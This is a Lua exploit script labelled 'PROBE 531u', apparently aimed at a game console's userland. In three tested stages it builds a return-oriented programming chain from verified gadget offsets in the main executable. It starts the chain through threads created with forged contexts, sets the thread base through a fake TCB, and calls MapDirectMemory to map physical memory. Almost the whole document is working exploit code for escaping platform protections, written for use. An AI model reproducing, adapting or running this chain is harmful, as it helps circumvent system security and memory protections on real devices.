-- CRASH_CLASS: HIGH
-- PROBE 531u: Incremental ROP chain build for MapDirectMemory
--
-- Build the chain step by step, testing each stage.
-- Uses CHAIN_14_10.md verified gadgets where possible.
--
-- Stage 1: pop_rax + pop_rdi + mov[rdi],rax + jmp$ (prove chain works)
-- Stage 2: add sysarch(165) for TLS before the store
-- Stage 3: add MapDirectMemory call
--
-- Key: use pop_rdi_ret at +0x75DFE (CHAIN_14_10 verified)
--       NOT +0xC9DFE (unverified, may be pop rdi; pop rbp; ret)

print("=== PROBE 531u: INCREMENTAL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

-- Gadgets — verify each one
local gadget_defs = {
    {0x992,    "pop_rax_ret",     {0x58, 0xC3}},
    {0x75DFE,  "pop_rdi_ret",     {0x5F, 0xC3}},
    {0xC9DFE,  "pop_rdi_ret_B",   {0x5F, 0xC3}},
    {0xD77D,   "pop_rsi_ret",     {0x5E, 0xC3}},
    {0x3B02D7, "pop_rdx_ret",     {0x5A, 0xC3}},
    {0xE64,    "pop_rcx_ret",     {0x59, 0xC3}},
    {0x92C67,  "mov_rdi_rax_ret", {0x48, 0x89, 0x07, 0xC3}},
}

print("[V] Gadget verification")
local all_ok = true
for _, g in ipairs(gadget_defs) do
    local off, name, expected = g[1], g[2], g[3]
    local bytes = {}
    local ok = true
    for bi = 0, #expected - 1 do
        local b = rb(eboot + off + bi)
        if b then table.insert(bytes, b)
            if b ~= expected[bi + 1] then ok = false end
        else table.insert(bytes, -1); ok = false end
    end
    -- Also read the NEXT byte to detect pop rdi; pop rbp; ret (5F 5D C3)
    local extra = rb(eboot + off + #expected)

    local hex = ""
    for _, b in ipairs(bytes) do
        hex = hex .. (b >= 0 and string.format("%02X ", b) or "?? ")
    end
    if extra then hex = hex .. string.format("[next:%02X]", extra) end

    print(string.format("  +0x%06X %-20s %s %s", off, name, ok and "OK" or "BAD", hex))
    if not ok then all_ok = false end
end

-- Verify syscall;ret gadget
local fn_val = to_num(syscall_ret)
if fn_val and fn_val > 0 then
    local b0 = rb(fn_val)
    local b1 = rb(fn_val + 1)
    local b2 = rb(fn_val + 2)
    print(string.format("  syscall;ret @ 0x%X: %02X %02X %02X", fn_val, b0 or 0, b1 or 0, b2 or 0))
end

-- Find jmp $ (EB FE)
local jmp_self = nil
for off = 0, 0x100000, 4 do
    local v = rd(eboot + off)
    if v then
        local vn = v; if vn < 0 then vn = vn + 0x100000000 end
        if (vn % 0x10000) == 0xFEEB then
            jmp_self = eboot + uint64(off); break
        end
        if math.floor(vn/0x100) % 0x10000 == 0xFEEB then
            jmp_self = eboot + uint64(off+1); break
        end
    end
end
print("  jmp$=" .. (jmp_self and q(jmp_self) or "NONE"))
if not jmp_self then print("ABORT: no jmp$") return end

if not all_ok then print("WARNING: some gadgets BAD") end

-- Use the verified gadgets (prefer +0x75DFE if OK)
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0x75DFE)  -- CHAIN_14_10 verified
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)

-- Allocate pages
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("shared=" .. q(shared) .. " stack=" .. q(stack_base))

-- ========================================
-- STAGE 1: Simple chain test
-- pop rax → CAFE, pop rdi → &shared, mov [rdi],rax, jmp$
-- ========================================
print("")
print("[S1] Simple chain (pop_rax + pop_rdi + store + park)")
wq(shared, uint64(0))
wq(shared + 8, uint64(0))

local chain = stack_base + 0x40000 - 0x400
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- RIP = pop_rax_ret, first pop reads chain[0]
emit(uint64("0xCAFE1234ABCD"))   -- RAX value
emit(pop_rdi_ret)                 -- next: pop rdi
emit(shared)                      -- RDI = &shared
emit(mov_rdi_rax_ret)             -- [rdi]=rax
emit(jmp_self)                    -- park

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)
wq(ctx + 0x0F8, chain)

local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 200000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local s1 = rq(shared)
print("  marker=" .. q(s1))
if s1 and to_num(s1) ~= 0 then
    print("  S1 SUCCESS!")
else
    print("  S1 FAILED — chain does not execute")
    print("=== 531u DONE ===")
    return
end

-- ========================================
-- STAGE 2: Chain with sysarch for TLS
-- pop rax → 165, pop rdi → 129, pop rsi → &tcb_ptr, syscall;ret,
-- pop rdi → &shared+8, mov[rdi],rax (sysarch rv), jmp$
-- ========================================
print("")
print("[S2] Sysarch chain (TLS setup)")
wq(shared + 8, uint64(0xBBBB))

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

local chain2 = stack_base + 0x40000 - 0x800
i = 0
local function emit2(v) wq(chain2 + i, v); i = i + 8 end

-- pop rax → 165 (sysarch)
emit2(uint64(165))
-- pop rdi → 129 (SET_FSBASE)
emit2(pop_rdi_ret)
emit2(uint64(129))
-- pop rsi → &tcb_ptr
emit2(pop_rsi_ret)
emit2(uint64(tcb_ptr_buf))
-- syscall; ret
emit2(syscall_ret)
-- store sysarch rv
emit2(pop_rdi_ret)
emit2(shared + 8)
emit2(mov_rdi_rax_ret)
-- park
emit2(jmp_self)

-- New context for stage 2
local ctx2 = memory.alloc(0x500)
zero(ctx2, 0x500)
wq(ctx2 + 0x108, uint64(0x480))
wd(ctx2 + 0x0D0, 0)
wq(ctx2 + 0x110, uint64(0x10000))
wq(ctx2 + 0x0C0, uint64(0x43))
wq(ctx2 + 0x100, uint64(0x3B))
wq(ctx2 + 0x0F0, uint64(0x202))
wq(ctx2 + 0x0E0, pop_rax_ret)
wq(ctx2 + 0x0F8, chain2)

wq(tid_buf, uint64(0))
local ok_tc2, rv_tc2 = pcall(function()
    return sc_thr_create(uint64(ctx2), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc2)) .. " tid=" .. q(rq(tid_buf)))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local s2 = rq(shared + 8)
print("  sysarch_rv=" .. q(s2))
if s2 and to_num(s2) ~= 0xBBBB then
    print("  S2 SUCCESS! sysarch returned " .. q(s2))
else
    print("  S2 FAILED — sysarch chain did not execute")
    print("=== 531u DONE ===")
    return
end

-- ========================================
-- STAGE 3: Full MapDirectMemory chain
-- ========================================
print("")
print("[S3] MapDirectMemory chain")

-- Get libkernel base
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
print("lk=" .. q(lk))

local alloc_fn = lk + uint64(0x17EF0)
local map_fn = lk + uint64(0x15020)

-- Allocate physical memory
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL alloc") return end

-- Shared slots for S3
wq(shared + 0x10, uint64(0))        -- VA output
wq(shared + 0x18, uint64(0xDDDD))   -- map rv
wq(shared + 0x20, uint64(0xEEEE))   -- done marker
wq(shared + 0x28, uint64(0xFFFF))   -- sysarch rv

-- New fake TCB for this child
local ok_t3, tcb3 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb3 + off, tcb3) end
local tcb3_ptr = memory.alloc(8)
wq(tcb3_ptr, tcb3)

-- Chain for S3
local chain3 = stack_base + 0x40000 - 0xC00
i = 0
local function emit3(v) wq(chain3 + i, v); i = i + 8 end

-- Phase A: sysarch(165) SET_FSBASE
emit3(uint64(165))       -- rax = 165
emit3(pop_rdi_ret)
emit3(uint64(129))       -- rdi = 129 (AMD64_SET_FSBASE)
emit3(pop_rsi_ret)
emit3(uint64(tcb3_ptr))  -- rsi = &tcb pointer
emit3(syscall_ret)       -- sysarch

-- Store sysarch rv
emit3(pop_rdi_ret)
emit3(shared + 0x28)     -- &sysarch_rv
emit3(mov_rdi_rax_ret)

-- Phase B: MapDirectMemory(out_ptr, len, prot, flags, phys, align, name)
-- r8/r9 from initial context, preserved through sysarch
emit3(pop_rdi_ret)
emit3(shared + 0x10)     -- rdi = out_ptr (&VA)
emit3(pop_rsi_ret)
emit3(uint64(0x4000))    -- rsi = len
emit3(pop_rdx_ret)
emit3(uint64(3))         -- rdx = prot (RW)
emit3(pop_rcx_ret)
emit3(uint64(0))         -- rcx = flags
emit3(map_fn)            -- call MapDirectMemory
-- map_fn's ret pops [rsp] = return addr, [rsp+8] = 7th arg (name)
local post_map = chain3 + i + 16
emit3(uint64(post_map))  -- return address
emit3(uint64(0))         -- name = NULL

-- Store map rv
emit3(pop_rdi_ret)       -- = post_map
emit3(shared + 0x18)
emit3(mov_rdi_rax_ret)

-- Done marker
emit3(pop_rdi_ret)
emit3(shared + 0x20)
emit3(pop_rax_ret)
emit3(uint64(0x444F4E45))  -- "DONE"
emit3(mov_rdi_rax_ret)

-- thr_exit
emit3(pop_rax_ret)
emit3(uint64(431))
emit3(syscall_ret)

print(string.format("  chain3=%d bytes", i))

-- Context for S3
local ctx3 = memory.alloc(0x500)
zero(ctx3, 0x500)
wq(ctx3 + 0x108, uint64(0x480))
wd(ctx3 + 0x0D0, 0)
wq(ctx3 + 0x110, uint64(0x10000))
wq(ctx3 + 0x0C0, uint64(0x43))
wq(ctx3 + 0x100, uint64(0x3B))
wq(ctx3 + 0x0F0, uint64(0x202))
wq(ctx3 + 0x0E0, pop_rax_ret)
wq(ctx3 + 0x0F8, chain3)
-- r8 = phys, r9 = align
wq(ctx3 + 0x068, phys)
wq(ctx3 + 0x070, uint64(0x4000))

wq(tid_buf, uint64(0))
local ok_tc3, rv_tc3 = pcall(function()
    return sc_thr_create(uint64(ctx3), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc3)) .. " tid=" .. q(rq(tid_buf)))

-- Wait up to 2s
for wait = 1, 20 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x20)
    if m then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xEEEE then break end
    end
end

-- Results
print("  sysarch_rv=" .. q(rq(shared + 0x28)))
print("  map_rv=" .. q(rq(shared + 0x18)))
print("  va=" .. q(rq(shared + 0x10)))
print("  done=" .. q(rq(shared + 0x20)))

local va_out = rq(shared + 0x10)
if va_out and to_num(va_out) ~= 0 then
    print("[MAP SUCCESS] va=" .. q(va_out))
    local van = to_num(va_out)
    pcall(function() memory.write_dword(van, 0xCAFEBABE) end)
    local rb_val = rd(van)
    if rb_val then
        if rb_val < 0 then rb_val = rb_val + 0x100000000 end
        print(string.format("  write/read: 0x%08X", rb_val))
    end
end

print("=== 531u DONE ===")
